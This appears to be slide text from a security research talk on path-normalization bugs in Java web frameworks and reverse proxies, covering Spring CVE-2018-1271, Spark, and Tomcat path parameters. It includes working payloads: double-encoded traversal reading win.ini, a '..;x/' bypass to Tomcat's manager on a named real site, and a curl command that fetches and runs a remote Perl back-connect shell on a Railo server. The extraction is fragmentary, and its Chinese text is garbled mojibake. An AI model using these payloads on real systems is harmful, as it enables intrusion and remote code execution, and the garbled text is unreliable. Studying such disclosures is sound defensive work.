Orange Tsai
Orange Tsai
DEVCORE ÂÆâÂÖ®Á†îÁ©∂Âëò
2014 ~ 2017 
2017 ~ Now
2008 ~ 2014 
2014 ~ 2017 
2017 ~ Now
2008 ~ 2014 
2014 ~ 2017 
2017 ~ Now
2008 ~ 2014 
- WAF?
‚Ä¢ X-www-form-urlencode
‚Ä¢ Multipart/form-data
‚Ä¢ Chunked
?
return read_file(resolve(root, path))
?
var UP_PATH_REGEXP = /(?:^|[\\/])\.\.(?:[\\/]|$)/
if (pathIsAbsolute.posix(path) || pathIsAbsolute.win32(path))
throw createError(400, 'Malicious Path')
if (UP_PATH_REGEXP.test(normalize('.' + sep + path)))
throw createError(403)
return read_file(resolve(root, path))
‚Ä¢ JSF Mojarra CVE-2013-3827 by SynopSys
‚Ä¢ JSF Mojarra CVE-2013-3827 by SynopSys
‚ÄúÁü•ËØÜÈù¢ÔºåÂÜ≥ÂÆöÁúãÂà∞ÁöÑÊîªÂáªÈù¢ÊúâÂ§öÂπø
Áü•ËØÜÁÇºÔºåÂÜ≥ÂÆöÂèëÂä®ÁöÑÊùÄ‰º§ÁÇºÊúâÂ§öÊ∑±‚Äù
- @Ringzero
1.
Spring Framework 0day - CVE-2018-1271
2.
Bynder(aseets.Spotify.com)
Spring CVE-2018-1271
Directory Traversal in Spring Framework
‚Ä¢ 2012 
(
CVE)
‚Ä¢
CVE-2014-3625 
‚Ä¢ Directory Traversal in Spring Framework
‚Ä¢ Spring Framework 3.0.4 to 3.2.11
‚Ä¢ Spring Framework 4.0.0 to 4.0.7
‚Ä¢ Spring Framework 4.1.0 to 4.1.1
Spring CVE-2018-1271
1. isInvalidPath(path)
2. isInvalidPath(URLDecoder.decode(path, "UTF-8"))
3. isResourceUnderLocation(resource, location)
Spring CVE-2018-1271
0day - CVE-2018-1271
F5 
protected boolean isInvalidPath(String path) {
if (path.contains("WEB-INF") || path.contains("META-INF")) {
return true;
}
if (path.contains(":/")) {
return true;
}
if (path.contains("..")) {
path = cleanPath(path);
if (path.contains("../")) {
return true;
}
}
return false;
Spring CVE-2018-1271
public static String cleanPath(String path) {
String pathToUse = replace(path, "\\", "/");
// implementation here
return path;
}
‚Ä¢
1. Server 
Windows 
2.
3.
CVE-2018-1199 
4.
Tomcat 
WildFly
Server
Hmmmm‚Ä¶
1. isInvalidPath(path)
2. isInvalidPath(URLDecoder.decode(path, "UTF-8"))
3. isResourceUnderLocation(resource, location)
protected boolean isInvalidPath(String path) {
if (path.contains("WEB-INF") || path.contains("META-INF")) {
return true;
}
if (path.contains(":/")) {
return true;
}
if (path.contains("..")) {
path = cleanPath(path);
if (path.contains("../")) {
return true;
}
}
return false;
isInvalidPath(‚Ä¶)
public static String cleanPath(String path) {
String pathToUse = replace(path, "\\", "/");
// implementation here
return path;
}
public static String cleanPath(String path) {
String pathToUse = replace(path, "\\", "/");
String[] pathArray = delimitedListToStringArray(pathToUse, "/");
List pathElements = new LinkedList<>();
int tops = 0;
// ...
isInvalidPath(‚Ä¶)
for (int i = pathArray.length - 1; i >= 0; i--) {
String element = pathArray[i];
if (".".equals(element)) {
} else if ("..".equals(element)) {
tops++;
} else {
if (tops > 0)
tops--;
else
pathElements.add(0, element);
}
}
isInvalidPath(‚Ä¶)
// Remaining top paths need to be retained.
for (int i = 0; i  pathElements = new LinkedList<>();
int tops = 0;
// ...
isInvalidPath(‚Ä¶)
isInvalidPath(‚Ä¶)
cleanPath
cleanPath
/
/
/
/../
/../
/../
/foo/..
/
/
/foo/../../
/../
/../
/foo//../
/foo/
/
/foo///../../
/foo/
/../
/foo////../../../
/foo/
/../../
protected boolean isInvalidPath(String path) {
if (path.contains("WEB-INF") || path.contains("META-INF")) {
return true;
}
if (path.contains(":/")) {
return true;
}
if (path.contains("..")) {
path = cleanPath(path);
if (path.contains("../")) {
return true;
}
}
return false;
isInvalidPath(‚Ä¶)
1. isInvalidPath(path)
2. isInvalidPath(URLDecoder.decode(path, "UTF-8"))
3. isResourceUnderLocation(resource, location)
‚Ä¢ Spring Framework 
Êü•
java.net.URL
‚Ä¢ Spring Framework 
java.net.URI
‚Ä¢
URL Decode 
!
isResourceUnderLocation()
‚Ä¢
@spring-projects/spring-amqp-samples
$ cd stocks
$ mvn install
$ copy target\spring-rabbit*.war \tomcat8\webapps\
$ \tomcat8\bin\catalina.bat run
New 0day - CVE-2018-1271
http://127.0.0.1:8080/spring-rabbit-stock/static/
%255C%255C%255C%255C%255C%255C%255C%255C%255C%255C%255C%255C
..%255C..%255C..%255C..%255C..%255C..%255C
..%255C..%255C..%255C..%255C..%255C..%255C
/Windows/win.ini
New 0day - CVE-2018-1271
Do not use Windows
‚Ä¢
‚Ä¢ DRY ‚Äì Don't Repeat Yourself
‚Ä¢ Spark Framework
‚Ä¢
Java 8 
Kotlin
‚Ä¢ GitHub 7500 Stars
‚Ä¢ CVE-2018-9159
‚Ä¢
commit 27018872d83fe425c89b417b09e7f7fd2d2a9c8c
Author: Per Wendel 
Date:   Sun May 18 12:04:11 2014 +0200
+   public static String cleanPath(String path) {
+   
if (path == null) {
Java EE 
‚Ä¢ Reverse Proxy
‚Ä¢
(Host or Port)
‚Ä¢
‚Ä¢
‚Ä¢
Java EE 
‚Ä¢
Java 
Reverse Proxy
‚Ä¢ Apache mod_jk
‚Ä¢ Apache mod_proxy
‚Ä¢ Nginx ProxyPass
‚Ä¢ ‚Ä¶
Java EE Â§öÂ±ÇÊ¨°Êû∂ÊûÑ
‚Ä¢
‚Ä¢ Apache + Cold Fusion
2011
http://example.com/manager%252F%252Ehtpasswd%2500.cfm
403
‚Ä¢ /manager/.htpasswd
404
‚Ä¢ /manager/x.cfm
404
‚Ä¢ /manager/x%2500.cfm
200
‚Ä¢ /manager%252F%252Ehtpasswd%2500.cfm
2011
‚Ä¢ Double Encoding 
‚Ä¢
mod_jk
(
)
‚Ä¢
?
2011
Path Parameter
Java EE URL Path Parameter
http://example.com/foo;name=orange,role=admin/bar/
http://example.com/foo;name=orange,role=admin/bar/
Apache
/foo;name=orange,role=admin/bar/
Nginx
/foo;name=orange,role=admin/bar/
IIS
/foo;name=orange,role=admin/bar/
Tomcat
/foo/bar/
Jetty
/foo/bar/
WildFly
/foo
WebLogic
/foo
64%
14%
9%
6%
4% 3%
Tomcat
Jboss/WildFly
Jetty
GlassFish
WebLogic
Other
200
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/hk/
404
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/manager/html
404
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/hk/../manager/html
401
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/hk/..;x/manager/html
200
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/hk/
404
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/manager/html
404
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/hk/../manager/html
401
‚Ä¢ https://mcdelivery.mcdonalds.com.hk/hk/..;x/manager/html
?
https://mcdelivery.mcdonalds.com.hk/hk/..;x/manager/html
/..;x/ 
/..;x/
/manager/html
Apache Mod_jk
üíÄ
Apache Mod_proxy
üíÄ
Nginx ProxyPass
üíÄ
‚Ä¢ 360 
Belluminar
WCTF 2016
‚Ä¢
‚Ä¢
‚Ä¢
assets.spotify.com
‚Ä¢ Out of Scope?
Bynder
Bynder
/
/login/
/x/
/login/
/login
/login/  
/login/x/
/login/x/
/login/../
/login/
/login/../../
/login/
/login/%2E%2E/
/login/
/login/%2E%2E/%252E/
/login/
/login/%252E%252E/
/login/
/login/%252E%252E/%252E%252E/
/login/
Bynder
‚Ä¢
?
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 26 May 2018 06:23:35 GMT
Content-Type: text/html;charset=UTF-8
Set-Cookie: JSESSIONID=C4E5824F-9EAE-4296...
...
Bynder
‚Ä¢ CFM ?
‚Ä¢ ColdFusion Markup (Language)
‚Ä¢ Engine
‚Ä¢ Adobe ColdFusion
‚Ä¢ Railo
‚Ä¢ Blue Dragon
‚Ä¢ ‚Ä¶
https://assets.spotify.com/login/..;/..;
/railo-context/admin/web.cfm
Bynder
/railo-context/../logs/exception.log
http://192.168.13.128:9999/railo-context/admin/
#output#.cfm
Bynder
$ curl https://assets.spotify.com/railo-context/admin/foo.cfm
-d 'SHELL=-c "curl orange.tw/bc.pl | perl -"'
Bynder
‚Ä¢
1.
2.
Authentication Bypass
3. Railo
Get Shell
Thank you 
PI:EMAIL
@orange_8361